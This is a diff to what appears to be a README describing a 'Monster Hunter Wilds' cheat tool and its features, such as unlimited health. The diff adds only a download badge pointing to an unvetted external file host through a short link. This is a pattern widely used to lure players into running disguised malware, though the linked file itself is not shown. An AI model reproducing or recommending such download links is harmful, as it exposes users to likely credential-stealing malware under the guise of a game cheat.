@@ -1,5 +1,7 @@
 **Monster Hunter Wilds Cheat** refers to various tools or mods that alter the gameplay of **Monster Hunter Wilds**. These cheats are typically used to enhance or bypass some of the game's challenges, offering advantages like unlimited health, resources, or enhanced abilities. Players may use cheats to make the game easier, experiment with different game mechanics, or simply enjoy a more relaxed and customizable experience.
 
+[![Download Monster Hunter Wilds Cheat](https://img.shields.io/badge/Download-MHWcheat%20-blueviolet)](https://downeefiles.com/s/mhwch)
+
 ### Common Features in Monster Hunter Wilds Cheats:
 1. **Unlimited Health**:  
    This cheat makes your character invincible, preventing you from losing health, which allows for endless battles against monsters.
